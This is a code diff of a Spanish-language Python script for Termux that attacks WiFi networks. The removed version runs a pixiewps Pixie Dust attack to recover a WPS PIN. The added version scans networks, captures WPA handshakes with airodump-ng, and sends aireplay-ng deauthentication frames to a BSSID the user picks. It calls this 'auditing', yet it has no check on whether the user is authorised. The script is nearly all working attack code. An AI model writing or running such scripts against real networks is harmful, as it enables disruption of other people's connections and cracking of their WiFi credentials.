@@ -1,79 +1,49 @@
-import subprocess
-import json
 import os
-import shutil
+import subprocess
 
-def run_command(command, use_sudo=False):
-    """Ejecuta un comando en la terminal y devuelve la salida."""
-    if use_sudo:
-        command = "sudo " + command
-    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    return result.stdout.decode(), result.stderr.decode()
+def instalar_dependencias():
+    # Instalar dependencias necesarias
+    os.system('pkg update && pkg upgrade')
+    os.system('pkg install root-repo')
+    os.system('pkg install tsu')
+    os.system('pkg install python')
+    os.system('pkg install git')
+    os.system('pkg install aircrack-ng')
+    os.system('pip install scapy')
 
-def scan_wifi():
-    """Escanea las redes Wi-Fi disponibles y devuelve una lista de redes."""
-    scan_command = "termux-wifi-scaninfo"
-    scan_stdout, scan_stderr = run_command(scan_command)
-    if scan_stderr:
-        print(f"Error al escanear redes Wi-Fi: {scan_stderr}")
-        return []
-    # Aquí se debería parsear la salida de scan_stdout para obtener las redes
-    # Por simplicidad, asumimos que devuelve una lista de BSSIDs
-    return scan_stdout.splitlines()
+def escanear_redes():
+    # Escanear redes WiFi disponibles
+    resultado = subprocess.check_output(['tsu', '-c', 'iwlist wlan0 scan'], universal_newlines=True)
+    redes = []
+    for linea in resultado.split('\n'):
+        if "ESSID" in linea:
+            essid = linea.split(':')[1].strip().strip('"')
+            redes.append(essid)
+    return redes
 
-def execute_pixiewps(bssid):
-    """Ejecuta pixiewps directamente."""
-    pixiewps_command = f"pixiewps -i wlan0 -b {bssid} -vv"
-    pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=True)
+def capturar_paquetes(bssid, channel):
+    # Capturar paquetes de una red específica
+    os.system(f'tsu -c "airodump-ng --bssid {bssid} -c {channel} -w handshake wlan0"')
 
-    if "WPS pin:" in pixie_stdout:
-        pin = extract_value(pixie_stdout, "WPS pin:")
-        print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
-        return pin
-    else:
-        print("\nPixie Dust no pudo encontrar el PIN.")
-        return None
-
-def extract_value(output, key):
-    """Extrae un valor específico de la salida basada en una clave."""
-    for line in output.splitlines():
-        if key in line:
-            return line.split(key)[-1].strip()
-    return None
-
-def check_prerequisites():
-    """Verifica que las herramientas necesarias estén instaladas."""
-    tools = ["termux-wifi-scaninfo", "pixiewps"]
-    for tool in tools:
-        if not shutil.which(tool):
-            print(f"Error: {tool} no está instalado. Por favor, instálalo e intenta nuevamente.")
-            return False
-    return True
-
-def main():
-    # Verificar herramientas necesarias
-    if not check_prerequisites():
-        return
-
-    # Escanear redes Wi-Fi
-    networks = scan_wifi()
-    if not networks:
-        print("No se encontraron redes Wi-Fi.\n")
-        return
-
-    # Mostrar redes disponibles
-    print("\nRedes Wi-Fi detectadas:")
-    for network in networks:
-        print(network)
-
-    # Aquí se debería seleccionar una red y ejecutar pixiewps
-    # Por simplicidad, asumimos que seleccionamos la primera red
-    if networks:
-        bssid = networks[0]
-        execute_pixiewps(bssid)
+def ataque_desautenticacion(bssid):
+    # Realizar un ataque de desautenticación para capturar el handshake
+    os.system(f'tsu -c "aireplay-ng --deauth 10 -a {bssid} wlan0"')
 
 if __name__ == "__main__":
-    main()
+    instalar_dependencias()
+    redes = escanear_redes()
+    print("Redes disponibles:")
+    for i, red in enumerate(redes):
+        print(f"{i + 1}. {red}")
+    
+    seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
+    red_seleccionada = redes[seleccion]
+    
+    bssid = input(f"Introduce el BSSID de la red {red_seleccionada}: ")
+    canal = input(f"Introduce el canal de la red {red_seleccionada}: ")
+    
+    capturar_paquetes(bssid, canal)
+    ataque_desautenticacion(bssid)
 
 
 
